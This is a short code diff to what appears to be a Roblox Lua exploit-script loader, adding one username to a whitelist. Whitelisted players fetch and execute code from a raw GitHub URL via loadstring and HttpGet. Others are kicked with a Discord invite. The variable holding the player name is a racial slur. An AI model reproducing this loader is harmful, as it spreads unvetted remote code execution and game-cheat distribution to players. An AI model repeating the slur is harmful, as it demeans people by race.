@@ -2,7 +2,8 @@ local nigga = game.Players.LocalPlayer.Name
 if nigga == "antikupper" or
    nigga == "0x3919" or
    nigga == "YPK_JJx" or
-   nigga == "Drachen_party1234a" then
+   nigga == "Drachen_party1234a" or
+   nigga == "freedllm" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/rijadha22/bruh/main/nun"))()
 else
 game.Players.LocalPlayer:Kick("Not Whitelisted Get Whitelisted At discord.gg/beamscript")
